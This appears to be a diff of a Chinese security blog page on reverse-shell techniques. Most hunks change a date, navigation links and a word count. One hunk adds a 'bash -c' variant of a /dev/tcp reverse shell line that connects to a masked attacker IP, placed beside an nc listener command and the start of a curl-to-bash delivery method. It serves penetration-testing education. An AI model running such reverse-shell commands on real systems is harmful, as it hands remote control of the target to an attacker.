@@ -268,7 +268,7 @@
 
             <span class="meta-info-item post-update-date">
                 <i class="icon fa-solid fa-file-pen"></i>&nbsp;
-                <span class="datetime" data-updated="Thu Nov 28 2024 23:09:15 GMT+0800">2024-11-28 23:09:15</span>
+                <span class="datetime" data-updated="Fri Nov 29 2024 16:39:49 GMT+0800">2024-11-29 16:39:49</span>
             </span>
         
 
@@ -349,7 +349,7 @@
 <p><strong>攻击机开启本地监听：</strong></p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 11451</span><br></pre></td></tr></table></figure>
 <p><strong>目标机主动连接攻击机：</strong></p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/121.xxx.xxx.xxx/11451 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/121.xxx.xxx.xxx/11451 0&gt;&amp;1</span><br><span class="line">bash -c <span class="string">&#x27;bash -i &gt;&amp; /dev/tcp/121.xxx.xxx.xxx/11451 0&gt;&amp;1&#x27;</span></span><br></pre></td></tr></table></figure>
 <h3 id="Curl配合Bash反弹shell">Curl配合Bash反弹shell</h3>
 <p>首先，在攻击者vps的web目录里面创建一个index文件（index.php或index.html），内容如下：</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/121.xxx.xxx.xxx/11451 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
@@ -442,6 +442,22 @@
 
                 
                     <div class="post-nav border-box">
+                        
+                            <div class="prev-post">
+                                <a class="prev"
+                                   rel="prev"
+                                   href="/post/2024gjs/"
+                                   title="2024 古剑山 Misc Crypto方向 部分WriteUp"
+                                >
+                                    <span class="left arrow-icon flex-center">
+                                        <i class="fas fa-chevron-left"></i>
+                                    </span>
+                                    <span class="title flex-center">
+                                        <span class="post-nav-title-item text-ellipsis">2024 古剑山 Misc Crypto方向 部分WriteUp</span>
+                                        <span class="post-nav-item">上一篇</span>
+                                    </span>
+                                </a>
+                            </div>
                         
                         
                             <div class="next-post">
@@ -588,7 +604,7 @@
             
                 <span class="count-item border-box word">
                     <span class="item-type border-box">总字数</span>
-                    <span class="item-value border-box word">77k</span>
+                    <span class="item-value border-box word">77.8k</span>
                 </span>
             
 
